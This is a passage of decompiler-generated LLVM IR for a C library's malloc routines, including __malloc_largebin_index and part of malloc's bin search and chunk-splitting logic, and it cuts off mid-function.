  %v4_120c4 = mul nuw nsw i32 %v3_120c0, 4
  %v5_120c4 = add i32 %v4_120c4, %arg1
  %v6_120c4 = inttoptr i32 %v5_120c4 to i32*
  %v7_120c4 = load i32, i32* %v6_120c4, align 4
  %v1_120c8 = urem i32 %v1_120bc, 32
  %tmp = shl i32 -1, %v1_120c8
  %v8_120d0 = add i32 %tmp, -1
  %v9_120d0 = and i32 %v7_120c4, %v8_120d0
  store i32 %v9_120d0, i32* %v6_120c4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_120bc, { 1, 0 }
}

define i32 @__malloc_largebin_index(i32 %arg1) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %v3_120e0 = udiv i32 %arg1, 256
  store i32 %v3_120e0, i32* %r1.global-to-local, align 4
  %v2_120e4 = icmp ugt i32 %arg1, 16777215
  store i32 %arg1, i32* %ip.global-to-local, align 4
  br i1 %v2_120e4, label %bb, label %bb1

bb:                                               ; preds = %entry
  br label %bb1

bb1:                                              ; preds = %entry, %bb
  %v0_120f0 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_120e4, i32 %v0_120f0)
  %v0_120f4 = load i32, i32* %r1.global-to-local, align 4
  %v1_120f4 = add i32 %v0_120f4, 1048320
  %v3_120f8 = udiv i32 %v1_120f4, 65536
  %v1_120fc = and i32 %v3_120f8, 8
  %v6_12100 = shl i32 %v0_120f4, %v1_120fc
  %v1_12104 = add i32 %v6_12100, 520192
  %v3_12108 = udiv i32 %v1_12104, 65536
  %v1_1210c = and i32 %v3_12108, 4
  %v6_12110 = shl i32 %v6_12100, %v1_1210c
  %v1_12114 = add i32 %v6_12110, 245760
  %v3_12118 = udiv i32 %v1_12114, 65536
  %v1_1211c = and i32 %v3_12118, 2
  %v6_12120 = shl i32 %v6_12110, %v1_1211c
  store i32 %v6_12120, i32* %r1.global-to-local, align 4
  %v1_12124 = sub nsw i32 13, %v1_120fc
  %v2_12128 = sub nsw i32 %v1_12124, %v1_1210c
  %v3_1212c = udiv i32 %v6_12120, 32768
  %v4_1212c = sub nuw nsw i32 -1, %v3_1212c
  %v4_12130 = udiv i32 %v6_12120, 16384
  %v5_12130 = and i32 %v4_12130, %v4_1212c
  %v2_12134 = sub nsw i32 %v2_12128, %v1_1211c
  %v2_12138 = add nsw i32 %v2_12134, %v5_12130
  %v1_1213c = add nsw i32 %v2_12138, 6
  %v0_12140 = load i32, i32* %ip.global-to-local, align 4
  %v6_12140 = lshr i32 %v0_12140, %v1_1213c
  %v3_12144 = mul nsw i32 %v2_12138, 4
  %v1_12148 = add nsw i32 %v3_12144, 32
  %v1_1214c = urem i32 %v6_12140, 4
  %v2_12150 = or i32 %v1_1214c, %v1_12148
  ret i32 %v2_12150

; uselistorder directives
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %bb1, { 1, 0 }
}

define i32 @malloc() local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_12158 = load i32, i32* @r4, align 4
  %v6_12158 = load i32, i32* @r5, align 4
  %v9_12158 = load i32, i32* @r6, align 4
  %v12_12158 = load i32, i32* @r7, align 4
  %v15_12158 = load i32, i32* @r8, align 4
  %v18_12158 = load i32, i32* @sb, align 4
  %v21_12158 = load i32, i32* @sl, align 4
  %v24_12158 = load i32, i32* @fp, align 4
  %v27_12158 = load i32, i32* @lr, align 4
  store i32 108, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22010.349 to i32), i32* %r1.global-to-local, align 4
  %v4_1216c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22010.349 to i32), i32 108) to i32*), align 4
  store i32 %v4_1216c, i32* %r4.global-to-local, align 4
  store i32 68, i32* %r3.global-to-local, align 4
  %v4_12178 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22010.349 to i32), i32 68) to i32*), align 4
  store i32 %v4_12178, i32* %r1.global-to-local, align 4
  %v0_1217c = load i32, i32* @r0, align 4
  store i32 %v0_1217c, i32* @r5, align 4
  store i32 %v4_1216c, i32* %r2.global-to-local, align 4
  %v2_12184 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_12184, i32* %r0.global-to-local, align 4
  store i32 112, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22010.349 to i32), i32* %ip.global-to-local, align 4
  %v4_12190 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22010.349 to i32), i32 112) to i32*), align 4
  store i32 %v4_12190, i32* %ip.global-to-local, align 4
  store i32 74140, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_12190)
  %v0_1219c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1219c, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22010.349 to i32), i32* @r1, align 4
  %v4_121a8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22010.349 to i32), i32 16) to i32*), align 4
  store i32 %v4_121a8, i32* @ip, align 4
  store i32 ptrtoint (i32* @global_var_121b4.431 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_121a8)
  %v0_121b4 = load i32, i32* @r5, align 4
  %tmp = icmp ult i32 %v0_121b4, -32
  br i1 %tmp, label %dec_label_pc_121d8, label %dec_label_pc_121bc

dec_label_pc_121bc:                               ; preds = %entry
  store i32 65180, i32* %r2.global-to-local, align 4
  %v0_121c0 = call i32 @__aeabi_read_tp()
  store i32 %v0_121c0, i32* %r0.global-to-local, align 4
  %v3_121c4 = load i16, i16* @global_var_22068.345, align 2
  %v4_121c4 = sext i16 %v3_121c4 to i32
  store i32 %v4_121c4, i32* %r2.global-to-local, align 4
  store i32 12, i32* @r3, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v3_121d0 = add i32 %v4_121c4, %v0_121c0
  %v4_121d0 = inttoptr i32 %v3_121d0 to i32*
  store i32 12, i32* %v4_121d0, align 4
  br label %dec_label_pc_12a5c

dec_label_pc_121d8:                               ; preds = %entry
  %v1_121d8 = add i32 %v0_121b4, 11
  store i32 %v1_121d8, i32* %r0.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22010.349 to i32), i32* %r2.global-to-local, align 4
  %v2_121e4 = icmp ugt i32 %v1_121d8, 14
  %v7_121e4 = icmp eq i32 %v1_121d8, 15
  %v2_121e8 = xor i1 %v7_121e4, true
  %v3_121e8 = and i1 %v2_121e4, %v2_121e8
  br i1 %v3_121e8, label %bb, label %bb141

bb:                                               ; preds = %dec_label_pc_121d8
  %v5_121e8 = and i32 %v1_121d8, -8
  store i32 %v5_121e8, i32* @sl, align 4
  br label %bb141

bb141:                                            ; preds = %dec_label_pc_121d8, %bb
  %v4_121ec = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22010.349 to i32), i32 64) to i32*), align 4
  store i32 %v4_121ec, i32* @r0, align 4
  %v1_121f0 = inttoptr i32 %v4_121ec to i32*
  %v2_121f0 = load i32, i32* %v1_121f0, align 4
  store i32 %v2_121f0, i32* @r4, align 4
  %v2_121f4 = xor i1 %v2_121e4, true
  %v3_121f4 = or i1 %v7_121e4, %v2_121f4
  br i1 %v3_121f4, label %bb142, label %bb143

bb142:                                            ; preds = %bb141
  store i32 16, i32* @sl, align 4
  br label %bb143

bb143:                                            ; preds = %bb141, %bb142
  %v1_121f8 = urem i32 %v2_121f0, 2
  %v2_121f8 = icmp eq i32 %v1_121f8, 0
  br i1 %v2_121f8, label %dec_label_pc_12200, label %dec_label_pc_12210

dec_label_pc_12200:                               ; preds = %bb143
  %v2_12200 = icmp eq i32 %v2_121f0, 0
  br i1 %v2_12200, label %dec_label_pc_12208, label %dec_label_pc_125ec

dec_label_pc_12208:                               ; preds = %dec_label_pc_12200
  %v0_12208 = call i32 @__malloc_consolidate()
  store i32 %v0_12208, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_125ec

dec_label_pc_12210:                               ; preds = %bb143
  %v0_12210 = load i32, i32* @sl, align 4
  %tmp204 = icmp ugt i32 %v0_12210, %v2_121f0
  br i1 %tmp204, label %dec_label_pc_12238, label %dec_label_pc_12218

dec_label_pc_12218:                               ; preds = %dec_label_pc_12210
  %v1_12218 = add i32 %v4_121ec, -4
  store i32 %v1_12218, i32* %r1.global-to-local, align 4
  %v3_1221c = udiv i32 %v0_12210, 8
  store i32 %v3_1221c, i32* %r2.global-to-local, align 4
  %v4_12220 = mul nuw i32 %v3_1221c, 4
  %v5_12220 = add i32 %v4_12220, %v1_12218
  %v6_12220 = inttoptr i32 %v5_12220 to i32*
  %v7_12220 = load i32, i32* %v6_12220, align 4
  store i32 %v7_12220, i32* %r0.global-to-local, align 4
  %v2_12224 = icmp eq i32 %v7_12220, 0
  br i1 %v2_12224, label %dec_label_pc_12238, label %.thread4

.thread4:                                         ; preds = %dec_label_pc_12218
  %v2_12228 = add i32 %v7_12220, 8
  %v3_12228 = inttoptr i32 %v2_12228 to i32*
  %v4_12228 = load i32, i32* %v3_12228, align 4
  store i32 %v4_12228, i32* %r3.global-to-local, align 4
  store i32 %v2_12228, i32* %r0.global-to-local, align 4
  store i32 %v2_12228, i32* %r4.global-to-local, align 4
  store i32 %v4_12228, i32* %v6_12220, align 4
  br label %dec_label_pc_12a40

dec_label_pc_12238:                               ; preds = %dec_label_pc_12218, %dec_label_pc_12210
  %tmp205 = icmp ugt i32 %v0_12210, 255
  br i1 %tmp205, label %dec_label_pc_12288, label %dec_label_pc_12240

dec_label_pc_12240:                               ; preds = %dec_label_pc_12238
  store i32 ptrtoint (i32* @global_var_22010.349 to i32), i32* %ip.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v4_12248 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22010.349 to i32), i32 64) to i32*), align 4
  %v3_1224c = udiv i32 %v0_12210, 8
  store i32 %v3_1224c, i32* @r7, align 4
  %v4_12250 = mul nuw i32 %v3_1224c, 8
  %v5_12250 = add i32 %v4_12248, %v4_12250
  store i32 %v5_12250, i32* %r3.global-to-local, align 4
  %v1_12254 = add i32 %v5_12250, 44
  store i32 %v1_12254, i32* %ip.global-to-local, align 4
  %v1_12258 = add i32 %v5_12250, 56
  %v2_12258 = inttoptr i32 %v1_12258 to i32*
  %v3_12258 = load i32, i32* %v2_12258, align 4
  store i32 %v3_12258, i32* %r0.global-to-local, align 4
  %v9_1225c = icmp eq i32 %v3_12258, %v1_12254
  br i1 %v9_1225c, label %dec_label_pc_123e8, label %dec_label_pc_12264

dec_label_pc_12264:                               ; preds = %dec_label_pc_12240
  %v2_12264 = add i32 %v3_12258, %v0_12210
  store i32 %v2_12264, i32* %r3.global-to-local, align 4
  %v1_12268 = add i32 %v2_12264, 4
  %v2_12268 = inttoptr i32 %v1_12268 to i32*
  %v3_12268 = load i32, i32* %v2_12268, align 4
  store i32 %v3_12268, i32* %r2.global-to-local, align 4
  %v1_1226c = add i32 %v3_12258, 12
  %v2_1226c = inttoptr i32 %v1_1226c to i32*
  %v3_1226c = load i32, i32* %v2_1226c, align 4
  store i32 %v3_1226c, i32* %r1.global-to-local, align 4
  %v1_12270 = or i32 %v3_12268, 1
  store i32 %v1_12270, i32* %r2.global-to-local, align 4
  %v1_12274 = add i32 %v3_12258, 8
  store i32 %v1_12274, i32* %r4.global-to-local, align 4
  store i32 %v1_12270, i32* %v2_12268, align 4
  %v0_1227c = load i32, i32* %ip.global-to-local, align 4
  %v1_1227c = load i32, i32* %r1.global-to-local, align 4
  %v2_1227c = add i32 %v1_1227c, 8
  %v3_1227c = inttoptr i32 %v2_1227c to i32*
  store i32 %v0_1227c, i32* %v3_1227c, align 4
  %v0_12280 = load i32, i32* %r1.global-to-local, align 4
  %v1_12280 = load i32, i32* %ip.global-to-local, align 4
  %v2_12280 = add i32 %v1_12280, 12
  %v3_12280 = inttoptr i32 %v2_12280 to i32*
  store i32 %v0_12280, i32* %v3_12280, align 4
  br label %dec_label_pc_12a40

dec_label_pc_12288:                               ; preds = %dec_label_pc_12238
  store i32 %v0_12210, i32* %r0.global-to-local, align 4
  %v1_1228c = call i32 @__malloc_largebin_index(i32 %v0_12210)
  store i32 %v1_1228c, i32* %r0.global-to-local, align 4
  %v0_12290 = load i32, i32* @r4, align 4
  %v1_12290 = and i32 %v0_12290, 2
  %v2_12290 = icmp eq i32 %v1_12290, 0
  store i32 %v1_1228c, i32* @r7, align 4
  br i1 %v2_12290, label %dec_label_pc_123e8, label %dec_label_pc_1229c

dec_label_pc_1229c:                               ; preds = %dec_label_pc_12288
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22010.349 to i32), i32* %r1.global-to-local, align 4
  %v4_122a4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22010.349 to i32), i32 64) to i32*), align 4
  store i32 %v4_122a4, i32* @r0, align 4
  %v0_122a8 = call i32 @__malloc_consolidate()
  store i32 %v0_122a8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_123e8

dec_label_pc_122b0:                               ; preds = %dec_label_pc_123fc
  %v1_122b0 = add i32 %v3_123fc, 4
  %v2_122b0 = inttoptr i32 %v1_122b0 to i32*
  %v3_122b0 = load i32, i32* %v2_122b0, align 4
  store i32 %v3_122b0, i32* %r3.global-to-local, align 4
  %v0_122b4 = load i32, i32* @sl, align 4
  %v1_122b8 = and i32 %v3_122b0, -4
  store i32 %v1_122b8, i32* %r4.global-to-local, align 4
  %v1_122bc = add i32 %v3_123fc, 12
  %v2_122bc = inttoptr i32 %v1_122bc to i32*
  %v3_122bc = load i32, i32* %v2_122bc, align 4
  store i32 %v3_122bc, i32* %ip.global-to-local, align 4
  %tmp206 = icmp ugt i32 %v0_122b4, 255
  br i1 %tmp206, label %dec_label_pc_12318, label %dec_label_pc_122c4

dec_label_pc_122c4:                               ; preds = %dec_label_pc_122b0
  %v9_122c4 = icmp eq i32 %v3_122bc, %v0_1231c
  br i1 %v9_122c4, label %dec_label_pc_122cc, label %dec_label_pc_12318

dec_label_pc_122cc:                               ; preds = %dec_label_pc_122c4
  %v0_122cc = load i32, i32* @sb, align 4
  %v1_122cc = add i32 %v0_122cc, 48
  %v2_122cc = inttoptr i32 %v1_122cc to i32*
  %v3_122cc = load i32, i32* %v2_122cc, align 4
  store i32 %v3_122cc, i32* %r3.global-to-local, align 4
  %v9_122d0 = icmp eq i32 %v3_123fc, %v3_122cc
  br i1 %v9_122d0, label %dec_label_pc_122d8, label %dec_label_pc_12318

dec_label_pc_122d8:                               ; preds = %dec_label_pc_122cc
  %v1_122d8 = load i32, i32* @fp, align 4
  %tmp207 = icmp ugt i32 %v1_122b8, %v1_122d8
  br i1 %tmp207, label %dec_label_pc_122e0, label %dec_label_pc_12318

dec_label_pc_122e0:                               ; preds = %dec_label_pc_122d8
  %v2_122e0 = sub i32 %v1_122b8, %v0_122b4
  store i32 %v2_122e0, i32* %r2.global-to-local, align 4
  %v2_122e4 = add i32 %v0_122b4, %v3_123fc
  store i32 %v2_122e4, i32* %r3.global-to-local, align 4
  %v1_122e8 = or i32 %v0_122b4, 1
  store i32 %v1_122e8, i32* %r0.global-to-local, align 4
  %v1_122ec = or i32 %v2_122e0, 1
  store i32 %v1_122ec, i32* %r1.global-to-local, align 4
  %v1_122f0 = add i32 %v3_123fc, 8
  store i32 %v1_122f0, i32* %r4.global-to-local, align 4
  %v2_122f4 = add i32 %v0_1231c, 8
  %v3_122f4 = inttoptr i32 %v2_122f4 to i32*
  store i32 %v2_122e4, i32* %v3_122f4, align 4
  %v0_122f8 = load i32, i32* %r3.global-to-local, align 4
  %v1_122f8 = load i32, i32* %ip.global-to-local, align 4
  %v2_122f8 = add i32 %v1_122f8, 12
  %v3_122f8 = inttoptr i32 %v2_122f8 to i32*
  store i32 %v0_122f8, i32* %v3_122f8, align 4
  %v0_122fc = load i32, i32* %r0.global-to-local, align 4
  %v1_122fc = load i32, i32* @r6, align 4
  %v2_122fc = add i32 %v1_122fc, 4
  %v3_122fc = inttoptr i32 %v2_122fc to i32*
  store i32 %v0_122fc, i32* %v3_122fc, align 4
  %v0_12300 = load i32, i32* %r3.global-to-local, align 4
  %v1_12300 = load i32, i32* @sb, align 4
  %v2_12300 = add i32 %v1_12300, 48
  %v3_12300 = inttoptr i32 %v2_12300 to i32*
  store i32 %v0_12300, i32* %v3_12300, align 4
  %v0_12304 = load i32, i32* %r2.global-to-local, align 4
  %v1_12304 = load i32, i32* %r3.global-to-local, align 4
  %v3_12304 = add i32 %v1_12304, %v0_12304
  %v4_12304 = inttoptr i32 %v3_12304 to i32*
  store i32 %v0_12304, i32* %v4_12304, align 4
  %v0_12308 = load i32, i32* %r1.global-to-local, align 4
  %v1_12308 = load i32, i32* %r3.global-to-local, align 4
  %v2_12308 = add i32 %v1_12308, 4
  %v3_12308 = inttoptr i32 %v2_12308 to i32*
  store i32 %v0_12308, i32* %v3_12308, align 4
  %v0_1230c = load i32, i32* %ip.global-to-local, align 4
  %v1_1230c = load i32, i32* %r3.global-to-local, align 4
  %v2_1230c = add i32 %v1_1230c, 12
  %v3_1230c = inttoptr i32 %v2_1230c to i32*
  store i32 %v0_1230c, i32* %v3_1230c, align 4
  %v0_12310 = load i32, i32* %ip.global-to-local, align 4
  %v1_12310 = load i32, i32* %r3.global-to-local, align 4
  %v2_12310 = add i32 %v1_12310, 8
  %v3_12310 = inttoptr i32 %v2_12310 to i32*
  store i32 %v0_12310, i32* %v3_12310, align 4
  br label %dec_label_pc_12a40

dec_label_pc_12318:                               ; preds = %dec_label_pc_122d8, %dec_label_pc_122cc, %dec_label_pc_122c4, %dec_label_pc_122b0
  %v9_12318 = icmp eq i32 %v1_122b8, %v0_122b4
  %v2_1231c = add i32 %v3_122bc, 8
  %v3_1231c = inttoptr i32 %v2_1231c to i32*
  store i32 %v0_1231c, i32* %v3_1231c, align 4
  %v0_12320 = load i32, i32* %ip.global-to-local, align 4
  %v1_12320 = load i32, i32* %r5.global-to-local, align 4
  %v2_12320 = add i32 %v1_12320, 12
  %v3_12320 = inttoptr i32 %v2_12320 to i32*
  store i32 %v0_12320, i32* %v3_12320, align 4
  br i1 %v9_12318, label %dec_label_pc_12478.loopexit, label %dec_label_pc_12334

dec_label_pc_12334:                               ; preds = %dec_label_pc_12318
  %v0_12334 = load i32, i32* %r4.global-to-local, align 4
  %tmp208 = icmp ugt i32 %v0_12334, 255
  br i1 %tmp208, label %dec_label_pc_12358, label %dec_label_pc_1233c

dec_label_pc_1233c:                               ; preds = %dec_label_pc_12334
  store i32 ptrtoint (i32* @global_var_22010.349 to i32), i32* %r2.global-to-local, align 4
  %v1_12340 = load i32, i32* %r8.global-to-local, align 4
  %v2_12340 = add i32 %v1_12340, ptrtoint (i32* @global_var_22010.349 to i32)
  %v3_12340 = inttoptr i32 %v2_12340 to i32*
  %v4_12340 = load i32, i32* %v3_12340, align 4
  %v3_12344 = udiv i32 %v0_12334, 8
  store i32 %v3_12344, i32* %r0.global-to-local, align 4
  %v4_12348 = mul nuw i32 %v3_12344, 8
  %v5_12348 = add i32 %v4_12340, %v4_12348
  store i32 %v5_12348, i32* %r3.global-to-local, align 4
  %v1_1234c = add i32 %v5_12348, 44
  store i32 %v1_1234c, i32* %ip.global-to-local, align 4
  %v1_12350 = add i32 %v5_12348, 52
  %v2_12350 = inttoptr i32 %v1_12350 to i32*
  %v3_12350 = load i32, i32* %v2_12350, align 4
  store i32 %v3_12350, i32* @lr, align 4
  br label %dec_label_pc_123b0

dec_label_pc_12358:                               ; preds = %dec_label_pc_12334
  store i32 %v0_12334, i32* %r0.global-to-local, align 4
  %v1_1235c = call i32 @__malloc_largebin_index(i32 %v0_12334)
  store i32 %v1_1235c, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22010.349 to i32), i32* %ip.global-to-local, align 4
  %v1_12364 = load i32, i32* %r8.global-to-local, align 4
  %v2_12364 = add i32 %v1_12364, ptrtoint (i32* @global_var_22010.349 to i32)
  %v3_12364 = inttoptr i32 %v2_12364 to i32*
  %v4_12364 = load i32, i32* %v3_12364, align 4
  %v4_12368 = mul i32 %v1_1235c, 8
  %v5_12368 = add i32 %v4_12364, %v4_12368
  store i32 %v5_12368, i32* %r3.global-to-local, align 4
  %v1_1236c = add i32 %v5_12368, 44
  store i32 %v1_1236c, i32* %ip.global-to-local, align 4
  %v1_12370 = add i32 %v5_12368, 52
  %v2_12370 = inttoptr i32 %v1_12370 to i32*
  %v3_12370 = load i32, i32* %v2_12370, align 4
  store i32 %v3_12370, i32* @lr, align 4
  %v9_12374 = icmp eq i32 %v3_12370, %v1_1236c
  br i1 %v9_12374, label %dec_label_pc_123b0, label %dec_label_pc_1237c

dec_label_pc_1237c:                               ; preds = %dec_label_pc_12358
  %v1_1237c = add i32 %v5_12368, 56
  %v2_1237c = inttoptr i32 %v1_1237c to i32*
  %v3_1237c = load i32, i32* %v2_1237c, align 4
  store i32 %v3_1237c, i32* %r1.global-to-local, align 4
  %v1_12380 = add i32 %v3_1237c, 4
  %v2_12380 = inttoptr i32 %v1_12380 to i32*
  %v3_12380 = load i32, i32* %v2_12380, align 4
  store i32 %v3_12380, i32* %r3.global-to-local, align 4
  %v0_12384 = load i32, i32* %r4.global-to-local, align 4
  %v3_12384 = icmp ult i32 %v0_12384, %v3_12380
  br i1 %v3_12384, label %.thread, label %dec_label_pc_123a0.preheader

.thread:                                          ; preds = %dec_label_pc_1237c
  store i32 %v1_1236c, i32* @lr, align 4
  store i32 %v3_1237c, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_123b0

dec_label_pc_123a0.preheader:                     ; preds = %dec_label_pc_1237c
  %v2_1238c = or i32 %v0_12384, 1
  store i32 %v2_1238c, i32* %r2.global-to-local, align 4
  %v1_123a0182 = add i32 %v3_12370, 4
  %v2_123a0183 = inttoptr i32 %v1_123a0182 to i32*
  %v3_123a0184 = load i32, i32* %v2_123a0183, align 4
  store i32 %v3_123a0184, i32* %r3.global-to-local, align 4
  %v3_123a4186 = icmp ult i32 %v2_1238c, %v3_123a0184
  br i1 %v3_123a4186, label %dec_label_pc_1239c, label %dec_label_pc_123ac

dec_label_pc_1239c:                               ; preds = %dec_label_pc_123a0.preheader, %dec_label_pc_1239c
  %v0_123ac187 = phi i32 [ %v3_1239c, %dec_label_pc_1239c ], [ %v3_12370, %dec_label_pc_123a0.preheader ]
  %v1_1239c = add i32 %v0_123ac187, 8
  %v2_1239c = inttoptr i32 %v1_1239c to i32*
  %v3_1239c = load i32, i32* %v2_1239c, align 4
  store i32 %v3_1239c, i32* @lr, align 4
  %v1_123a0 = add i32 %v3_1239c, 4
  %v2_123a0 = inttoptr i32 %v1_123a0 to i32*
  %v3_123a0 = load i32, i32* %v2_123a0, align 4
  store i32 %v3_123a0, i32* %r3.global-to-local, align 4
  %v3_123a4 = icmp ult i32 %v2_1238c, %v3_123a0
  br i1 %v3_123a4, label %dec_label_pc_1239c, label %dec_label_pc_123ac

dec_label_pc_123ac:                               ; preds = %dec_label_pc_1239c, %dec_label_pc_123a0.preheader
  %v0_123ac.lcssa = phi i32 [ %v3_12370, %dec_label_pc_123a0.preheader ], [ %v3_1239c, %dec_label_pc_1239c ]
  %v1_123ac = add i32 %v0_123ac.lcssa, 12
  %v2_123ac = inttoptr i32 %v1_123ac to i32*
  %v3_123ac = load i32, i32* %v2_123ac, align 4
  store i32 %v3_123ac, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_123b0

dec_label_pc_123b0:                               ; preds = %.thread, %dec_label_pc_12358, %dec_label_pc_1233c, %dec_label_pc_123ac
  %v0_123d0 = phi i32 [ %v1_1236c, %dec_label_pc_12358 ], [ %v1_1234c, %dec_label_pc_1233c ], [ %v3_123ac, %dec_label_pc_123ac ], [ %v3_1237c, %.thread ]
  %v0_123c4 = phi i32 [ %v1_1235c, %dec_label_pc_12358 ], [ %v3_12344, %dec_label_pc_1233c ], [ %v1_1235c, %dec_label_pc_123ac ], [ %v1_1235c, %.thread ]
  %v1_123b4 = phi i32 [ %v1_12364, %dec_label_pc_12358 ], [ %v1_12340, %dec_label_pc_1233c ], [ %v1_12364, %dec_label_pc_123ac ], [ %v1_12364, %.thread ]
  store i32 ptrtoint (i32* @global_var_22010.349 to i32), i32* %r2.global-to-local, align 4
  %v2_123b4 = add i32 %v1_123b4, ptrtoint (i32* @global_var_22010.349 to i32)
  %v3_123b4 = inttoptr i32 %v2_123b4 to i32*
  %v4_123b4 = load i32, i32* %v3_123b4, align 4
  %v3_123b8 = sdiv i32 %v0_123c4, 32
  store i32 %v3_123b8, i32* %r3.global-to-local, align 4
  %v4_123bc = mul nsw i32 %v3_123b8, 4
  %v5_123bc = add i32 %v4_123b4, %v4_123bc
  store i32 %v5_123bc, i32* %r1.global-to-local, align 4
  %v1_123c0 = add i32 %v5_123bc, 820
  %v2_123c0 = inttoptr i32 %v1_123c0 to i32*
  %v3_123c0 = load i32, i32* %v2_123c0, align 4
  %v1_123c4 = urem i32 %v0_123c4, 32
  store i32 %v1_123c4, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v7_123cc = shl i32 1, %v1_123c4
  %v8_123cc = or i32 %v3_123c0, %v7_123cc
  store i32 %v8_123cc, i32* %r3.global-to-local, align 4
  %v1_123d0 = load i32, i32* @r6, align 4
  %v2_123d0 = add i32 %v1_123d0, 12
  %v3_123d0 = inttoptr i32 %v2_123d0 to i32*
  store i32 %v0_123d0, i32* %v3_123d0, align 4
  %v0_123d4 = load i32, i32* @lr, align 4
  %v1_123d4 = load i32, i32* @r6, align 4
  %v2_123d4 = add i32 %v1_123d4, 8
  %v3_123d4 = inttoptr i32 %v2_123d4 to i32*
  store i32 %v0_123d4, i32* %v3_123d4, align 4
  %v0_123d8 = load i32, i32* %r3.global-to-local, align 4
  %v1_123d8 = load i32, i32* %r1.global-to-local, align 4
  %v2_123d8 = add i32 %v1_123d8, 820
  %v3_123d8 = inttoptr i32 %v2_123d8 to i32*
  store i32 %v0_123d8, i32* %v3_123d8, align 4
  %v0_123dc = load i32, i32* @r6, align 4
  %v1_123dc = load i32, i32* @lr, align 4
  %v2_123dc = add i32 %v1_123dc, 12
  %v3_123dc = inttoptr i32 %v2_123dc to i32*
  store i32 %v0_123dc, i32* %v3_123dc, align 4
  %v0_123e0 = load i32, i32* @r6, align 4
  %v1_123e0 = load i32, i32* %ip.global-to-local, align 4
  %v2_123e0 = add i32 %v1_123e0, 8
  %v3_123e0 = inttoptr i32 %v2_123e0 to i32*
  store i32 %v0_123e0, i32* %v3_123e0, align 4
  %v0_123fc.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_123fc

dec_label_pc_123e8:                               ; preds = %dec_label_pc_12288, %dec_label_pc_12240, %dec_label_pc_1229c
  store i32 64, i32* %r8.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22010.349 to i32), i32* %r1.global-to-local, align 4
  %v4_123f0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22010.349 to i32), i32 64) to i32*), align 4
  store i32 %v4_123f0, i32* @sb, align 4
  %v0_123f4 = load i32, i32* @sl, align 4
  %v1_123f4 = add i32 %v0_123f4, 16
  store i32 %v1_123f4, i32* @fp, align 4
  %v1_123f8 = add i32 %v4_123f0, 52
  store i32 %v1_123f8, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_123fc

dec_label_pc_123fc:                               ; preds = %dec_label_pc_123b0, %dec_label_pc_123e8
  %v0_1231c = phi i32 [ %v0_123fc.pre, %dec_label_pc_123b0 ], [ %v1_123f8, %dec_label_pc_123e8 ]
  %v1_123fc = add i32 %v0_1231c, 12
  %v2_123fc = inttoptr i32 %v1_123fc to i32*
  %v3_123fc = load i32, i32* %v2_123fc, align 4
  store i32 %v3_123fc, i32* @r6, align 4
  %v9_12400 = icmp eq i32 %v3_123fc, %v0_1231c
  br i1 %v9_12400, label %dec_label_pc_12408, label %dec_label_pc_122b0

dec_label_pc_12408:                               ; preds = %dec_label_pc_123fc
  %v0_12408 = load i32, i32* @sl, align 4
  %tmp209 = icmp ult i32 %v0_12408, 256
  %v0_124c0.pre = load i32, i32* @r7, align 4
  br i1 %tmp209, label %dec_label_pc_12408.dec_label_pc_124c0_crit_edge, label %dec_label_pc_12410

dec_label_pc_12408.dec_label_pc_124c0_crit_edge:  ; preds = %dec_label_pc_12408
  %.pre203 = mul i32 %v0_124c0.pre, 8
  br label %dec_label_pc_124c0

dec_label_pc_12410:                               ; preds = %dec_label_pc_12408
  %v4_12410 = mul i32 %v0_124c0.pre, 8
  %v5_12410 = add i32 %v4_12410, %v0_1231c
  store i32 %v5_12410, i32* %r3.global-to-local, align 4
  %v1_12414 = add i32 %v5_12410, -8
  store i32 %v1_12414, i32* %r1.global-to-local, align 4
  %v1_12418 = add i32 %v5_12410, 4
  %v2_12418 = inttoptr i32 %v1_12418 to i32*
  %storemerge.pre = load i32, i32* %v2_12418, align 4
  br label %dec_label_pc_124b8

